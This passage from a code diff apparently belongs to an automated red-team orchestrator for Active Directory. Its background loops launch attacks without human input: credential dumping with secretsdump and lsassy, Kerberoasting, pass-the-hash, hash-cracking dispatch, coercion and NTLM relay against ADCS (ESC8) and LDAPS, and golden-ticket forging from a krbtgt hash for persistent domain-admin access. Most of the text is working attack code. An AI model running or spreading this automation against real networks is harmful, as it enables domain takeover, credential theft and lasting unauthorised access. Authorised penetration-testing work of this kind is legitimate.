+                # there's no constrained delegation path (S4U) available
+                for dc_ip in dc_hosts_in_domain:
+                    has_s4u_path = _has_constrained_delegation_for_target(state, dc_ip)
+                    is_privileged = _is_likely_privileged_credential(cred.username, cred.source)
+
+                    if has_s4u_path and not is_privileged:
+                        # Skip secretsdump - let the S4U attack path handle this DC
+                        logger.info(
+                            f"Skipping secretsdump on DC {dc_ip} for {cred.username}: "
+                            f"constrained delegation path exists, use S4U instead"
+                        )
+                        continue
+
+                    # Either privileged credential or no S4U path - try secretsdump
+                    dc_task_id = await dispatcher.request_credential_access(
+                        source_agent="orchestrator",
+                        domain=domain_name,
+                        target_ips=[dc_ip],
+                        username=cred.username,
+                        password=cred.password,
+                        credential_source=cred.source,
+                        reason="new_credential_dc",
+                        techniques=["kerberoast", "secretsdump"],  # No lsassy on DCs
+                    )
+                    if dc_task_id and not cred_task_id:
+                        cred_task_id = dc_task_id
+
                 # Also dispatch FAST credential discovery separately (only needs DC targets)
                 # These are high-value low-hanging fruit that take ~2-5 seconds each
                 # Running them separately ensures they complete quickly without getting
                 # blocked by slow recon (smb_sweep) or credential dumping (secretsdump)
-                dc_hosts = [
-                    h
-                    for h in domain_hosts
-                    if any(
-                        r in ("DC", "Domain Controller")
-                        for r in (
-                            next((host.roles for host in state.all_hosts if host.ip == h), []) or []
-                        )
+                # NOTE: These techniques require password auth (not hash), skip if no password
+                if cred.password:
+                    dc_targets = dc_hosts_in_domain or domain_hosts[:1]
+                    await dispatcher.request_credential_access(
+                        source_agent="orchestrator",
+                        domain=domain_name,
+                        target_ips=dc_targets,
+                        username=cred.username,
+                        password=cred.password,
+                        credential_source=cred.source,
+                        reason="fast_credential_discovery",
+                        techniques=[
+                            "sysvol_script_search",  # ~2 sec, hardcoded passwords in SYSVOL
+                            "gpp_password_finder",  # ~2 sec, GPP/cpassword credentials
+                            "ldap_search_descriptions",  # ~3 sec, passwords in user descriptions
+                            "laps_dump",  # ~2 sec, LAPS local admin passwords
+                        ],
                     )
-                ] or domain_hosts[:1]  # Fall back to first host if no DC identified
-                await dispatcher.request_credential_access(
-                    source_agent="orchestrator",
-                    domain=domain_name,
-                    target_ips=dc_hosts,
-                    username=cred.username,
-                    password=cred.password,
-                    credential_source=cred.source,
-                    reason="fast_credential_discovery",
-                    techniques=[
-                        "sysvol_script_search",  # ~2 sec, hardcoded passwords in SYSVOL
-                        "gpp_password_finder",  # ~2 sec, GPP/cpassword credentials
-                        "ldap_search_descriptions",  # ~3 sec, passwords in user descriptions
-                        "laps_dump",  # ~2 sec, LAPS local admin passwords
-                    ],
-                )
-                if task_id:
-                    processed_creds.add(key)
+                # Always mark as processed to prevent retry storm when throttled
+                # The deferred queue handles actual retries for deferred tasks
+                state.processed_cred_expansion.add(key)
+                if cred_task_id:
                     logger.info(
-                        "Auto credential access dispatched for {}\\{} (source={})",
-                        cred.domain or "(unknown)",
-                        cred.username,
-                        cred.source or "unknown",
+                        f"Auto credential access dispatched for {cred.domain or '(unknown)'}\\{cred.username} (source={cred.source or 'unknown'})"
                     )
 
             for hash_obj in state.all_hashes:
-                key = (hash_obj.username, hash_obj.domain or "", hash_obj.hash_value)
+                hash_key = _make_hash_key(
+                    hash_obj.username, hash_obj.domain or "", hash_obj.hash_value
+                )
                 # Credential access (pass-the-hash) only for NTLM-compatible hashes
-                if key not in processed_hashes:
+                if hash_key not in state.processed_hash_lateral:
                     if not _is_pass_the_hash_compatible(hash_obj.hash_value, hash_obj.hash_type):
                         logger.info(
-                            "Skipping credential access for {}\\{}: non-NTLM hash type {}",
-                            hash_obj.domain or "(unknown)",
-                            hash_obj.username,
-                            hash_obj.hash_type or "unknown",
+                            f"Skipping credential access for {hash_obj.domain or '(unknown)'}\\{hash_obj.username}: non-NTLM hash type {hash_obj.hash_type or 'unknown'}"
                         )
-                        processed_hashes.add(key)
+                        state.processed_hash_lateral.add(hash_key)
                     else:
                         domain_name = hash_obj.domain or (
                             state.target.domain if state.target else ""
                         )
-                        domain_hosts = hosts_by_domain.get(domain_name.lower(), []) or host_ips
-                        task_id = await dispatcher.request_credential_access(
-                            source_agent="orchestrator",
-                            domain=domain_name,
-                            target_ips=domain_hosts,
-                            username=hash_obj.username,
-                            hash_value=hash_obj.hash_value,
-                            hash_type=hash_obj.hash_type,
-                            reason="new_hash",
-                            techniques=["kerberoast", "secretsdump", "lsassy"],
+                        domain_hosts = (
+                            _iter_hosts_by_domain.get(domain_name.lower(), []) or host_ips
                         )
-                        if task_id:
-                            processed_hashes.add(key)
+
+                        # Separate DC hosts from non-DC hosts for smart hash usage
+                        non_dc_hosts = [h for h in domain_hosts if h not in dc_ips]
+                        dc_hosts_in_domain = [h for h in domain_hosts if h in dc_ips]
+
+                        # For non-DC hosts: always try pass-the-hash
+                        hash_task_id: str | None = None
+                        if non_dc_hosts:
+                            hash_task_id = await dispatcher.request_credential_access(
+                                source_agent="orchestrator",
+                                domain=domain_name,
+                                target_ips=non_dc_hosts,
+                                username=hash_obj.username,
+                                hash_value=hash_obj.hash_value,
+                                hash_type=hash_obj.hash_type,
+                                reason="new_hash_non_dc",
+                                techniques=["kerberoast", "secretsdump", "lsassy"],
+                            )
+
+                        # For DC hosts: only try if privileged or no S4U path
+                        for dc_ip in dc_hosts_in_domain:
+                            has_s4u_path = _has_constrained_delegation_for_target(state, dc_ip)
+                            is_privileged = _is_likely_privileged_credential(
+                                hash_obj.username, hash_obj.source
+                            )
+
+                            if has_s4u_path and not is_privileged:
+                                logger.info(
+                                    f"Skipping secretsdump on DC {dc_ip} for {hash_obj.username} (hash): "
+                                    f"constrained delegation path exists, use S4U instead"
+                                )
+                                continue
+
+                            dc_task_id = await dispatcher.request_credential_access(
+                                source_agent="orchestrator",
+                                domain=domain_name,
+                                target_ips=[dc_ip],
+                                username=hash_obj.username,
+                                hash_value=hash_obj.hash_value,
+                                hash_type=hash_obj.hash_type,
+                                reason="new_hash_dc",
+                                techniques=["kerberoast", "secretsdump"],
+                            )
+                            if dc_task_id and not hash_task_id:
+                                hash_task_id = dc_task_id
+
+                        # Always mark as processed to prevent retry storm when throttled
+                        state.processed_hash_lateral.add(hash_key)
+                        if hash_task_id:
                             logger.info(
-                                "Auto credential access dispatched for {}\\{} (hash_type={})",
-                                hash_obj.domain or "(unknown)",
-                                hash_obj.username,
-                                hash_obj.hash_type or "unknown",
+                                f"Auto credential access dispatched for {hash_obj.domain or '(unknown)'}\\{hash_obj.username} (hash_type={hash_obj.hash_type or 'unknown'})"
                             )
 
                 # Crack requests for ALL hashes (AS-REP, Kerberoast, NTLM, etc.)
-                crack_key = (
+                crack_key = _make_crack_key(
                     hash_obj.username,
                     hash_obj.domain or "",
                     hash_obj.hash_value,
-                    (hash_obj.hash_type or "").upper(),
+                    hash_obj.hash_type or "",
                 )
                 if hash_obj.cracked_password:
-                    processed_crack_hashes.add(crack_key)
+                    state.processed_crack_requests.add(crack_key)
                     continue
-                if crack_key in processed_crack_hashes:
+                if crack_key in state.processed_crack_requests:
                     continue
 
                 # Determine priority based on hash type
@@ -1721,14 +1910,12 @@ async def _auto_credential_access(  # noqa: PLR0912
                 if "$krb5tgs$" in hash_value_lower or "KERBEROAST" in hash_type_upper:
                     crack_priority = 2  # High priority - service accounts often weak
                     logger.info(
-                        f"Kerberoast hash detected for {hash_obj.domain}\\{hash_obj.username}, "
-                        f"boosting crack priority to {crack_priority}"
+                        f"Kerberoast hash detected for {hash_obj.domain}\\{hash_obj.username}, boosting crack priority to {crack_priority}"
                     )
                 elif "$krb5asrep$" in hash_value_lower or "ASREP" in hash_type_upper:
                     crack_priority = 3  # Medium-high priority
                     logger.info(
-                        f"AS-REP hash detected for {hash_obj.domain}\\{hash_obj.username}, "
-                        f"boosting crack priority to {crack_priority}"
+                        f"AS-REP hash detected for {hash_obj.domain}\\{hash_obj.username}, boosting crack priority to {crack_priority}"
                     )
 
                 crack_task_id = await dispatcher.request_crack(
@@ -1739,20 +1926,105 @@ async def _auto_credential_access(  # noqa: PLR0912
                     domain=hash_obj.domain,
                     priority=crack_priority,
                 )
+                # Always mark as processed to prevent retry storm when throttled
+                # The deferred queue handles actual retries for deferred tasks
+                state.processed_crack_requests.add(crack_key)
                 if crack_task_id:
-                    processed_crack_hashes.add(crack_key)
                     logger.info(
-                        "Auto crack dispatched for {}\\{} ({}, priority={})",
-                        hash_obj.domain or "(unknown)",
-                        hash_obj.username,
-                        hash_obj.hash_type or "unknown",
-                        crack_priority,
+                        f"Auto crack dispatched for {hash_obj.domain or '(unknown)'}\\{hash_obj.username} ({hash_obj.hash_type or 'unknown'}, priority={crack_priority})"
                     )
 
         except asyncio.CancelledError:
             break
         except Exception as e:
             logger.error(f"Auto credential access error: {e}", exc_info=True)
+            await asyncio.sleep(check_interval)
+
+
+async def _auto_crack_dispatch(
+    dispatcher: RedTeamDispatcher,
+    check_interval: float = 30.0,
+) -> None:
+    """
+    Dedicated background task for dispatching hash crack requests.
+
+    This runs independently of _auto_credential_access to ensure crack tasks
+    are always dispatched promptly when new hashes are discovered.
+
+    Processes: AS-REP, Kerberoast, and other crackable hash types.
+    """
+    while True:
+        try:
+            await asyncio.sleep(check_interval)
+
+            state = dispatcher.shared_state
+
+            # NOTE: Don't exit on has_domain_admin - we still want to crack hashes
+            # after DA for reporting/persistence. Crack tasks don't use LLM tokens.
+            if state.completed:
+                logger.debug("Operation complete, stopping auto crack dispatch")
+                break
+
+            if not state.all_hashes:
+                continue
+
+            for hash_obj in state.all_hashes:
+                # Skip already cracked
+                if hash_obj.cracked_password:
+                    continue
+
+                # Build crack key for deduplication
+                crack_key = _make_crack_key(
+                    hash_obj.username,
+                    hash_obj.domain or "",
+                    hash_obj.hash_value,
+                    hash_obj.hash_type or "",
+                )
+
+                if crack_key in state.processed_crack_requests:
+                    continue
+
+                # Determine priority based on hash type
+                crack_priority = 5  # Default
+                hash_value_lower = hash_obj.hash_value.lower()
+                hash_type_upper = (hash_obj.hash_type or "").upper()
+
+                if "$krb5tgs$" in hash_value_lower or "KERBEROAST" in hash_type_upper:
+                    crack_priority = 2  # High priority - service accounts
+                    logger.info(
+                        f"Auto-crack: Kerberoast hash for {hash_obj.domain}\\{hash_obj.username}, priority={crack_priority}"
+                    )
+                elif "$krb5asrep$" in hash_value_lower or "ASREP" in hash_type_upper:
+                    crack_priority = 3  # Medium-high priority
+                    logger.info(
+                        f"Auto-crack: AS-REP hash for {hash_obj.domain}\\{hash_obj.username}, priority={crack_priority}"
+                    )
+                else:
+                    logger.info(
+                        f"Auto-crack: {hash_obj.hash_type} hash for {hash_obj.domain}\\{hash_obj.username}, priority={crack_priority}"
+                    )
+
+                crack_task_id = await dispatcher.request_crack(
+                    hash_value=hash_obj.hash_value,
+                    hash_type=hash_obj.hash_type or "unknown",
+                    source_agent="orchestrator",
+                    username=hash_obj.username,
+                    domain=hash_obj.domain or "",
+                    priority=crack_priority,
+                )
+
+                # Always mark as processed to prevent retry storm when throttled
+                # The deferred queue handles actual retries for deferred tasks
+                state.processed_crack_requests.add(crack_key)
+                if crack_task_id:
+                    logger.info(
+                        f"Auto-crack dispatched: {hash_obj.domain}\\{hash_obj.username} ({hash_obj.hash_type}) -> {crack_task_id}"
+                    )
+
+        except asyncio.CancelledError:
+            break
+        except Exception as e:
+            logger.error(f"Auto crack dispatch error: {e}", exc_info=True)
             await asyncio.sleep(check_interval)
 
 
@@ -1774,10 +2046,10 @@ async def _auto_coercion(  # noqa: PLR0912
         dispatcher: The dispatcher instance
         check_interval: Seconds between coercion checks
     """
-    # Track what we've already triggered to avoid duplicates
-    esc8_attempted_servers: set[str] = set()  # ADCS servers we've started ESC8 against
-    coerced_dcs: set[str] = set()  # DCs we've attempted to coerce
-    writable_share_targets: set[tuple[str, str]] = set()  # (host, share) combos notified
+    # NOTE: All tracking now uses state fields for restart recovery
+    # - state.processed_esc8_servers: ADCS servers we've started ESC8 against
+    # - state.processed_state.processed_coerced_dcs: DCs we've attempted to coerce
+    # - state.processed_writable_shares: "host:share" combos notified
 
     while True:
         try:
@@ -1825,7 +2097,7 @@ async def _auto_coercion(  # noqa: PLR0912
             # When ADCS servers with web enrollment are detected, start ntlmrelayx + petitpotam
             adcs_servers = dispatcher.find_adcs_servers()
             for server_ip, server_hostname in adcs_servers:
-                if server_ip in esc8_attempted_servers:
+                if server_ip in state.processed_esc8_servers:
                     continue
 
                 # Find a DC to coerce for ESC8 (DCs authenticating to ADCS = domain admin cert)
@@ -1862,18 +2134,18 @@ async def _auto_coercion(  # noqa: PLR0912
                     },
                 )
 
+                # Always mark as processed to prevent retry storm when throttled
+                state.processed_esc8_servers.add(server_ip)
                 if task_id:
-                    esc8_attempted_servers.add(server_ip)
-                    logger.warning(
-                        f"🎯 Auto ESC8 coercion dispatched: relay to ADCS {server_hostname or server_ip}, "
-                        f"coerce DC {target_dc.hostname or target_dc.ip} (task {task_id})"
+                    logger.info(
+                        f"🎯 Auto ESC8 coercion dispatched: relay to ADCS {server_hostname or server_ip}, coerce DC {target_dc.hostname or target_dc.ip} (task {task_id})"
                     )
 
             # === DC COERCION FOR LDAPS RELAY ===
             # Even without ADCS, coercing DCs to an LDAPS relay can grant RBCD/shadow creds
             for host in state.all_hosts:
                 # Reuse the _is_dc function defined above for ESC8
-                if not _is_dc(host) or host.ip in coerced_dcs:
+                if not _is_dc(host) or host.ip in state.processed_coerced_dcs:
                     continue
 
                 # Only coerce if we have credentials to authenticate the relay
@@ -1897,14 +2169,15 @@ async def _auto_coercion(  # noqa: PLR0912
                     },
                 )
 
+                # Always mark as processed to prevent retry storm when throttled
+                state.processed_coerced_dcs.add(host.ip)
                 if task_id:
-                    coerced_dcs.add(host.ip)
-                    logger.warning(
+                    logger.info(
                         f"🎯 Auto LDAPS relay coercion dispatched: coerce DC {host.hostname or host.ip} "
                         f"for RBCD (task {task_id})"
                     )
-                    # Only do one DC at a time to avoid overwhelming the coercion agent
-                    break
+                # Only do one DC at a time to avoid overwhelming the coercion agent
+                break
 
             # === WRITABLE SHARE NOTIFICATION ===
             # Log writable shares that could be used for file-based coercion (.lnk/.scf drops)
@@ -1914,18 +2187,17 @@ async def _auto_coercion(  # noqa: PLR0912
                 if "WRITE" not in perms:
                     continue
 
-                share_key = (share.host.lower(), share.name.lower())
-                if share_key in writable_share_targets:
+                share_key = f"{share.host.lower()}:{share.name.lower()}"
+                if share_key in state.processed_writable_shares:
                     continue
 
                 # Skip admin shares
                 if share.name.lower() in ("admin$", "c$", "d$", "e$", "ipc$"):
                     continue
 
-                writable_share_targets.add(share_key)
+                state.processed_writable_shares.add(share_key)
                 logger.info(
-                    f"📁 Writable share detected: {share.host}/{share.name} ({perms}) - "
-                    f"potential target for file-based coercion (.lnk/.scf drop)"
+                    f"Writable share detected: {share.host}/{share.name} ({perms}) - potential for file-based coercion"
                 )
 
         except asyncio.CancelledError:
@@ -1937,7 +2209,7 @@ async def _auto_coercion(  # noqa: PLR0912
 
 async def _auto_delegation_enumeration(  # noqa: PLR0912
     dispatcher: RedTeamDispatcher,
-    check_interval: float = 60.0,
+    check_interval: float = 15.0,
 ) -> None:
     """
     Background task that automatically runs delegation enumeration for discovered credentials.
@@ -1948,14 +2220,17 @@ async def _auto_delegation_enumeration(  # noqa: PLR0912
 
     These are high-value targets for privilege escalation.
 
+    Note: Immediate delegation dispatch also happens in publish_credential() for cracked
+    hashes. This periodic loop serves as a backup for other credential sources.
+
     Args:
         dispatcher: The dispatcher instance
-        check_interval: Seconds between checks for new credentials
+        check_interval: Seconds between checks for new credentials (default: 15s for faster detection)
     """
-    # Track credentials that have completed successfully - only these won't be retried
-    processed_creds: set[tuple[str, str]] = set()
-    # Track dispatched tasks: task_id -> cred_key (for checking completion status)
-    dispatched_tasks: dict[str, tuple[str, str]] = {}
+    # NOTE: Processed credentials are persisted in state.processed_delegation_creds
+    # Format: "domain:username" - successful delegation enumerations
+    # Track dispatched tasks: task_id -> cred_key (transient, for completion tracking)
+    dispatched_tasks: dict[str, str] = {}
 
     while True:
         try:
@@ -1968,7 +2243,7 @@ async def _auto_delegation_enumeration(  # noqa: PLR0912
                 logger.debug("Operation complete, stopping delegation enumeration")
                 break
 
-            # Check for completed/failed tasks and update processed_creds accordingly
+            # Check for completed/failed tasks and update state accordingly
             completed_task_ids = list(dispatched_tasks.keys())
             for task_id in completed_task_ids:
                 cred_key = dispatched_tasks[task_id]
@@ -1984,24 +2259,18 @@ async def _auto_delegation_enumeration(  # noqa: PLR0912
                     del dispatched_tasks[task_id]
 
                     if task_result.success:
-                        # Task succeeded - mark credential as processed (won't retry)
-                        processed_creds.add(cred_key)
-                        logger.info(
-                            f"✅ Auto-delegation task {task_id} succeeded for "
-                            f"{cred_key[0]}\\{cred_key[1]}"
-                        )
+                        # Task succeeded - persist to state (won't retry after restart)
+                        state.processed_delegation_creds.add(cred_key)
+                        logger.info(f"Auto-delegation task {task_id} succeeded for {cred_key}")
                     else:
-                        # Task failed - DON'T add to processed_creds so it can be retried
+                        # Task failed - DON'T add to state so it can be retried
                         logger.warning(
-                            f"❌ Auto-delegation task {task_id} failed for "
-                            f"{cred_key[0]}\\{cred_key[1]}: {task_result.error}. "
-                            f"Will retry on next cycle."
+                            f"Auto-delegation task {task_id} failed for {cred_key}: {task_result.error}. Will retry."
                         )
                 else:
                     # Task not in pending or completed - probably lost, allow retry
                     logger.warning(
-                        f"⚠️ Auto-delegation task {task_id} missing for "
-                        f"{cred_key[0]}\\{cred_key[1]}, allowing retry"
+                        f"Auto-delegation task {task_id} missing for {cred_key}, allowing retry"
                     )
                     del dispatched_tasks[task_id]
 
@@ -2015,10 +2284,10 @@ async def _auto_delegation_enumeration(  # noqa: PLR0912
                 if not cred.password:
                     continue
 
-                cred_key = ((cred.domain or "").lower(), cred.username.lower())
+                cred_key = f"{(cred.domain or '').lower()}:{cred.username.lower()}"
 
-                # Skip if already processed successfully
-                if cred_key in processed_creds:
+                # Skip if already processed successfully (persisted in state)
+                if cred_key in state.processed_delegation_creds:
                     continue
 
                 # Skip if currently dispatched (task in flight)
@@ -2031,10 +2300,8 @@ async def _auto_delegation_enumeration(  # noqa: PLR0912
                     continue
 
                 # Dispatch delegation enumeration to PRIVESC agent (has DelegationTools)
-                logger.info(
-                    f"🔍 Auto-delegation: Running find_delegation for {cred.domain}\\{cred.username}"
-                )
-
+                # Note: request_privesc_enumeration() has its own deduplication check against
+                # pending_tasks, so it may return "" if a task already exists for this credential.
                 task_id = await dispatcher.request_privesc_enumeration(
                     source_agent="orchestrator",
                     domain=domain,
@@ -2047,7 +2314,14 @@ async def _auto_delegation_enumeration(  # noqa: PLR0912
                     # Track as dispatched - will be marked processed only on success
                     dispatched_tasks[task_id] = cred_key
                     logger.info(
-                        f"Auto-delegation task {task_id} dispatched for {cred.domain}\\{cred.username}"
+                        f"Auto-delegation: dispatched find_delegation task {task_id} "
+                        f"for {cred.domain}\\{cred.username}"
+                    )
+                else:
+                    # Task was deferred or deduplicated - don't spam logs
+                    logger.debug(
+                        f"Auto-delegation: find_delegation for {cred.domain}\\{cred.username} "
+                        "was deferred or already pending"
                     )
 
         except asyncio.CancelledError:
@@ -2076,9 +2350,9 @@ async def _auto_local_admin_secretsdump(  # noqa: PLR0912
         dispatcher: The dispatcher instance
         check_interval: Seconds between checks for admin access opportunities
     """
-    # Track (host_ip, cred_key) -> task_id for deduplication
+    # Track (host_ip, username, domain) -> task_id for in-flight deduplication (transient)
     secretsdump_attempts: dict[tuple[str, str, str], str] = {}
-    successful_hosts: set[str] = set()  # Hosts where secretsdump succeeded
+    # NOTE: successful hosts are persisted in state.processed_secretsdump for restart recovery
     failed_attempts: dict[tuple[str, str, str], int] = {}  # Track failures for retry limiting
     max_retries = 2
 
@@ -2101,15 +2375,15 @@ async def _auto_local_admin_secretsdump(  # noqa: PLR0912
                 if task_id not in state.pending_tasks:
                     task_result = state.completed_tasks.get(task_id)
                     if task_result and task_result.success:
-                        successful_hosts.add(host_ip)
+                        # Persist successful host to state for restart recovery
+                        state.processed_secretsdump.add(host_ip)
                         logger.info(
-                            f"✅ Auto-secretsdump succeeded on {host_ip} with {domain}\\{username}"
+                            f"Auto-secretsdump succeeded on {host_ip} with {domain}\\{username}"
                         )
                     elif task_result and not task_result.success:
                         failed_attempts[key] = failed_attempts.get(key, 0) + 1
                         logger.warning(
-                            f"❌ Auto-secretsdump failed on {host_ip} with {domain}\\{username}: "
-                            f"{task_result.error} (attempt {failed_attempts[key]}/{max_retries})"
+                            f"Auto-secretsdump failed on {host_ip} with {domain}\\{username}: {task_result.error} (attempt {failed_attempts[key]}/{max_retries})"
                         )
                     del secretsdump_attempts[key]
 
@@ -2128,7 +2402,7 @@ async def _auto_local_admin_secretsdump(  # noqa: PLR0912
                 target_hosts = []
                 for host in state.all_hosts:
                     # Skip already successful hosts
-                    if host.ip in successful_hosts:
+                    if host.ip in state.processed_secretsdump:
                         continue
 
                     # Skip hosts without IP
@@ -2161,7 +2435,7 @@ async def _auto_local_admin_secretsdump(  # noqa: PLR0912
                         continue
 
                     # Dispatch secretsdump task
-                    logger.warning(
+                    logger.info(
                         f"🔓 Auto-secretsdump: Admin access detected for {cred_domain}\\{cred.username} "
                         f"on {host.ip} ({host.hostname}), dispatching secretsdump"
                     )
@@ -2193,7 +2467,7 @@ async def _auto_local_admin_secretsdump(  # noqa: PLR0912
                     continue
 
                 target_ip = vuln.target
-                if not target_ip or target_ip in successful_hosts:
+                if not target_ip or target_ip in state.processed_secretsdump:
                     continue
 
                 # Get details about who has admin access
@@ -2227,7 +2501,7 @@ async def _auto_local_admin_secretsdump(  # noqa: PLR0912
                 if key in secretsdump_attempts or failed_attempts.get(key, 0) >= max_retries:
                     continue
 
-                logger.warning(
+                logger.info(
                     f"🔓 Auto-secretsdump: BloodHound {vuln.vuln_type} detected - "
                     f"{admin_domain}\\{admin_user} has admin on {target_ip}, dispatching secretsdump"
                 )
@@ -2257,6 +2531,350 @@ async def _auto_local_admin_secretsdump(  # noqa: PLR0912
             await asyncio.sleep(check_interval)
 
 
+async def _auto_golden_ticket(  # noqa: PLR0912
+    dispatcher: RedTeamDispatcher,
+    check_interval: float = 30.0,
+) -> None:
+    """
+    Background task that automatically generates golden ticket when krbtgt hash is found.
+
+    Monitors the shared state for krbtgt hashes and automatically:
+    1. Extracts domain SID via lookupsid
+    2. Generates golden ticket with impacket-ticketer
+    3. Stores ticket info in state.golden_tickets (persisted to Redis)
+    4. Sets has_golden_ticket flag in state
+
+    This provides persistent domain admin access.
+
+    Args:
+        dispatcher: The dispatcher instance
+        check_interval: Seconds between checks
+    """
+    import re
+
+    while True:
+        try:
+            await asyncio.sleep(check_interval)
+
+            state = dispatcher.shared_state
+
+            # Skip if operation is complete
+            if state.completed:
+                logger.debug("Operation complete, stopping auto golden ticket")
+                break
+
+            # Get domains that already have golden tickets (from persisted state)
+            processed_domains = {
+                t.get("domain", "").lower() for t in state.golden_tickets if t.get("domain")
+            }
+
+            # Look for krbtgt hashes we haven't processed yet
+            for hash_obj in state.all_hashes:
+                if hash_obj.username.lower() != "krbtgt":
+                    continue
+
+                if hash_obj.hash_type.lower() != "ntlm":
+                    continue
+
+                domain = hash_obj.domain
+                if not domain or domain.lower() in processed_domains:
+                    continue
+
+                # Found unprocessed krbtgt hash!
+                logger.info(
+                    f"🎫 Auto-golden-ticket: Found krbtgt hash for {domain}, "
+                    "attempting to generate golden ticket"
+                )
+
+                # Need a credential to run lookupsid
+                cred = None
+                for c in state.all_credentials:
+                    if c.password and c.domain and c.domain.lower() == domain.lower():
+                        cred = c
+                        break
+
+                if not cred:
+                    # Try any credential
+                    for c in state.all_credentials:
+                        if c.password:
+                            cred = c
+                            break
+
+                if not cred:
+                    logger.warning(
+                        f"🎫 Auto-golden-ticket: No password credential available for SID lookup "
+                        f"in {domain}, skipping golden ticket (will retry)"
+                    )
+                    continue
+
+                # Find DC IP for this domain
+                dc_ip = None
+                for host in state.all_hosts:
+                    hostname = (host.hostname or "").lower()
+                    if domain.lower() in hostname and any(
+                        role.lower() in ("dc", "domain controller") for role in host.roles
+                    ):
+                        dc_ip = host.ip
+                        break
+
+                # Fallback to any DC
+                if not dc_ip:
+                    for host in state.all_hosts:
+                        if any(role.lower() in ("dc", "domain controller") for role in host.roles):
+                            dc_ip = host.ip
+                            break
+
+                if not dc_ip:
+                    logger.warning(f"🎫 Auto-golden-ticket: No DC IP found for {domain}, skipping")
+                    # Add failed attempt to state so we don't retry forever
+                    state.golden_tickets.append(
+                        {
+                            "domain": domain,
+                            "ticket_path": None,
+                            "created_at": datetime.now(timezone.utc).isoformat(),
+                            "status": "failed_no_dc",
+                        }
+                    )
+                    continue
+
+                # Run lookupsid to get domain SID
+                try:
+                    from ares.tools.red.common import run_tool
+
+                    cmd = [
+                        "impacket-lookupsid",
+                        f"{cred.domain}/{cred.username}:{cred.password}@{dc_ip}",
+                    ]
+                    stdout, stderr, _ = run_tool(cmd, timeout_seconds=60)
+                    output = stdout + "\n" + (stderr or "")
+
+                    # Parse domain SID from output
+                    sid_match = re.search(r"Domain SID is:\s*(S-\d+-\d+-\d+-\d+-\d+-\d+)", output)
+                    if not sid_match:
+                        logger.warning(
+                            f"🎫 Auto-golden-ticket: Could not extract domain SID for {domain}"
+                        )
+                        state.golden_tickets.append(
+                            {
+                                "domain": domain,
+                                "ticket_path": None,
+                                "created_at": datetime.now(timezone.utc).isoformat(),
+                                "status": "failed_no_sid",
+                            }
+                        )
+                        continue
+
+                    domain_sid = sid_match.group(1)
+                    logger.info(f"🎫 Auto-golden-ticket: Got domain SID {domain_sid} for {domain}")
+
+                    # Generate golden ticket
+                    ticket_path = "Administrator.ccache"
+                    cmd = [
+                        "impacket-ticketer",
+                        "-nthash",
+                        hash_obj.hash_value,
+                        "-domain-sid",
+                        domain_sid,
+                        "-domain",
+                        domain,
+                        "-user-id",
+                        "500",
+                        "Administrator",
+                    ]
+                    stdout, stderr, returncode = run_tool(cmd, timeout_seconds=120)
+                    output = stdout + "\n" + (stderr or "")
+
+                    if returncode == 0 or "Saving ticket" in output:
+                        logger.success(
+                            f"🎫 GOLDEN TICKET GENERATED for {domain}!\n"
+                            f"→ Ticket saved as {ticket_path}\n"
+                            f"→ Use: export KRB5CCNAME={ticket_path}\n"
+                            f"→ Then: psexec.py -k -no-pass dc.{domain}"
+                        )
+                        state.has_golden_ticket = True
+
+                        # Store ticket details in state (persisted to Redis!)
+                        state.golden_tickets.append(
+                            {
+                                "domain": domain,
+                                "ticket_path": ticket_path,
+                                "domain_sid": domain_sid,
+                                "krbtgt_hash": hash_obj.hash_value,
+                                "created_at": datetime.now(timezone.utc).isoformat(),
+                                "status": "success",
+                            }
+                        )
+
+                        # Add to state timeline
+                        from ares.core.models import TimelineEvent
+
+                        state.operation_timeline.append(
+                            TimelineEvent(
+                                timestamp=datetime.now(timezone.utc),
+                                source="auto_golden_ticket",
+                                event_type="golden_ticket_forged",
+                                description=f"Golden ticket generated for {domain} Administrator",
+                                mitre_technique="T1558.001",
+                            )
+                        )
+                    else:
+                        logger.warning(
+                            f"🎫 Auto-golden-ticket: Failed to generate ticket for {domain}: {output}"
+                        )
+                        state.golden_tickets.append(
+                            {
+                                "domain": domain,
+                                "ticket_path": None,
+                                "created_at": datetime.now(timezone.utc).isoformat(),
+                                "status": "failed_ticketer",
+                                "error": output[:500],
+                            }
+                        )
+
+                except Exception as e:
+                    logger.warning(f"🎫 Auto-golden-ticket: Error generating ticket: {e}")
+                    state.golden_tickets.append(
+                        {
+                            "domain": domain,
+                            "ticket_path": None,
+                            "created_at": datetime.now(timezone.utc).isoformat(),
+                            "status": "failed_exception",
+                            "error": str(e)[:500],
+                        }
+                    )
+
+        except asyncio.CancelledError:
+            break
+        except Exception as e:
+            logger.error(f"Auto golden ticket error: {e}", exc_info=True)
+            await asyncio.sleep(check_interval)
+
+
+async def _auto_acl_chain_follow(  # noqa: PLR0912
+    dispatcher: RedTeamDispatcher,
+    check_interval: float = 30.0,
+) -> None:
+    """
+    Automatically follow ACL chains discovered by BloodHound.
+
+    When BloodHound discovers multi-hop ACL paths to Domain Admin,
+    this automation:
+    1. Tracks chain progress
+    2. Dispatches tasks for each step
+    3. Re-authenticates with new credentials
+    4. Continues until DA is achieved
+
+    Args:
+        dispatcher: The dispatcher instance
+        check_interval: Seconds between chain progress checks
+    """
+    from ares.core.dispatcher.acl_chains import ACLChainTracker
+
+    state = dispatcher.shared_state
+
+    # Initialize tracker if not present (with state for persistence!)
+    if not hasattr(dispatcher, "_acl_chain_tracker"):
+        dispatcher._acl_chain_tracker = ACLChainTracker(state=state)
+    elif dispatcher._acl_chain_tracker._state is None:
+        dispatcher._acl_chain_tracker.set_state(state)
+
+    tracker: ACLChainTracker = dispatcher._acl_chain_tracker
+
+    while True:
+        try:
+            await asyncio.sleep(check_interval)
+
+            # Re-read state each iteration for latest tracking
+            state = dispatcher.shared_state
+
+            # Skip if DA already achieved
+            if state.has_domain_admin:
+                continue
+
+            # Check for chains that need progress
+            for chain in list(tracker.chains.values()):
+                if chain.is_complete:
+                    continue
+
+                current_step = chain.current_step
+                if not current_step:
+                    continue
+
+                step_key = f"{chain.chain_id}:{current_step.step_id}"
+                if step_key in state.dispatched_acl_steps:
+                    continue
+
+                # Check if we have credentials for the source user
+                source_cred = None
+                for cred in state.all_credentials:
+                    if cred.username.lower() == current_step.source.lower() and cred.password:
+                        source_cred = cred
+                        break
+
+                if not source_cred:
+                    # Check if previous step provided a credential
+                    if chain.current_step_index > 0:
+                        prev_step = chain.steps[chain.current_step_index - 1]
+                        if prev_step.new_credential:
+                            # Create credential from previous step
+                            from ares.core.models import Credential
+
+                            source_cred = Credential(
+                                username=prev_step.new_credential.get("username", ""),
